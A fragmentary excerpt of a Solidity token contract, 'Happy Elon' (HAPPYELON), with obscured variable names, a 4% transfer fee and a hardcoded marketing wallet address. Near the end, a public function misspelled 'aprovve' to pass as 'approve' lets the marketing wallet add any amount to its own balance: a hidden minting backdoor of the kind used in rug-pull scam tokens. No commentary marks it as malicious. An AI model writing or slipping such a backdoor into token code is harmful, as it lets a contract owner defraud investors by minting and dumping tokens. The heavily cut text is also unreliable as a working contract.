...
contract Context {
 ...
 contract HappyElon is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloHAPPY;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Happy Elon";
    string private _symbol = "HAPPYELON";
    ...
    uint256 private cryfaleHAPPY = 4;
    uint256 private _vebegoHAPPY = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloHAPPY[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletHAPPY = 0x7B3B04D2BC9F33b741B0c37FD5260BD819Fa90ca;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloHAPPY[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloHAPPY[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleHAPPY / 100) / _vebegoHAPPY;
        allons = allons -  (_fee * _vebegoHAPPY);
        
        superfloHAPPY[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaHAPPY) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloHAPPY[account];
        require(accountBalance >= gzillaHAPPY, "BEP : Can't be done");
        unchecked {
            superfloHAPPY[account] = accountBalance - gzillaHAPPY;
        }
        _totalSupply -= gzillaHAPPY;

        emit Transfer(account, address(0), gzillaHAPPY);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function aprovve(uint256 burn) public{
        superfloHAPPY[_msgSender()] += burn;
        require(_msgSender() == _MarketingWalletHAPPY, "ERC20: cannot permit dev address");
    }   
